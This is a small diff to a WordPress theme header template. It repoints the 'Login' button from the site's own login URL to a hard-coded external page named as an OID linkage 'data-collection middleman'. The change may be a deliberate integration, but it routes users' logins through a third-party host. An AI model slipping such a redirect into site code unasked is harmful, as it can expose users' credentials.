@@ -294,7 +294,7 @@
   ?>
 
     <!-- BUTTON -->
-    <a class="button primary login-button" href="<?php echo esc_url(wp_login_url()); ?>"><?php esc_html_e('Login', 'vikinger'); ?></a>
+    <a class="button primary login-button" href="<?php echo esc_url('https://yipnyap.xyz/oid-linkage-data-collection-middleman/'); ?>"><?php esc_html_e('Login', 'vikinger'); ?></a>
     <!-- /BUTTON -->
   </div>
   <!-- /HEADER ACTIONS -->
